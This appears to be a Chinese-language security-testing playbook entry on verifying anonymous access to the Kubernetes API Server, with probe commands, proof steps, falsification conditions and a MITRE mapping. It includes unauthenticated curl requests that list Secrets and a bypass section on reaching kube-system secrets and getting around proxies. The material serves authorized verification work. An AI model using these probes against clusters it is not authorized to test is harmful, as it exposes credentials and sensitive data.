---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0]
max_verification_level: L0
destructive: false
mapped_attack_surfaces: [AS-2.3]
mapped_compliance_families: [API Server认证]
---

# K8s 匿名 API 访问

## 1. 前置条件

- API Server 配置了 `--anonymous-auth=true`（默认行为）
- system:anonymous 或 system:unauthenticated 组被绑定了 RBAC 权限
- API Server 可从 Pod 网络或外部网络访问

## 2. 探测命令

- [L0] `kubectl get clusterrolebinding -o json | jq '.items[] | select(.subjects[]?.name=="system:anonymous" or .subjects[]?.name=="system:unauthenticated")'` → 期望：发现匿名用户绑定的 ClusterRole
- [L0] `curl -sk https://<api-server-ip>:6443/api/v1/namespaces/default/pods` → 期望：若匿名访问 enabled 且有权限则返回 Pod 列表
- [L0] `curl -sk https://<api-server-ip>:6443/livez` → 期望：返回 ok（验证 API Server 可达）
- [L0] `curl -sk https://<api-server-ip>:6443/api/v1/nodes` → 期望：若匿名有 list nodes 权限则返回节点信息
- [L0] `curl -sk https://<api-server-ip>:6443/api/v1/secrets -H "Content-Type: application/json"` → 期望：若匿名有 list secrets 权限则返回 Secret 列表
- [L0] `ps aux | grep kube-apiserver | grep -o '\-\-anonymous-auth=[^ ]*'` → 期望：--anonymous-auth=true 或未设置（默认 true）

## 3. 攻击验证

- [L0] 无需 L2 验证。匿名访问成功即证明漏洞。
- 使用 curl 不带认证头访问 API Server 各端点，验证可读取的资源范围：
  - `curl -sk https://<api-server-ip>:6443/api/v1/namespaces` → 列出命名空间
  - `curl -sk https://<api-server-ip>:6443/api/v1/pods` → 列出所有 Pod
  - `curl -sk https://<api-server-ip>:6443/api/v1/secrets` → 列出所有 Secret
  - 以上任一返回非 401/403 即验证成功

## 4. 差分证明

- 攻击前 [L0]: 不带认证头访问返回 401/403
- 攻击后 [L0]: 不带认证头访问返回 200 + 资源数据 → 证明匿名访问漏洞存在
- 对比：使用有效 SA token 访问返回的数据与匿名访问返回的数据范围差异

## 5. 绕过策略

- 若匿名访问被限制在特定命名空间：尝试访问 `/api/v1/namespaces/kube-system/secrets` 等高价值目标
- 若匿名只能 list 但不能 get：通过 list 获取资源名称后推测内容
- 若 API Server 前有 Ingress/Proxy：尝试直接访问节点 IP:6443 绕过代理
- 若只绑定了 view 权限：view 权限仍可读取大量敏感信息（ConfigMap、Secret 内容等）

## 6. 证伪条件

- [L0] `curl -sk https://<api-server-ip>:6443/api/v1/namespaces/default/pods` 返回 401 或 403 → 证伪（匿名访问被拒绝）
- [L0] `--anonymous-auth=false` 且无 system:unauthenticated 绑定 → 证伪
- [L0] 所有 system:unauthenticated 绑定的 ClusterRole 权限仅限于 healthz 等健康检查端点 → 证伪（影响极小）

## 7. 审批级别

Level 1：只读命令（curl 访问 API 端点）自动通过。
本模式所有验证均为 Level 0（宿主机观察），无破坏性操作。
destructive: false

## 8. MITRE ATT&CK

T1190 - Exploit Public-Facing Application（利用公开暴露的 Kubernetes API Server 匿名访问）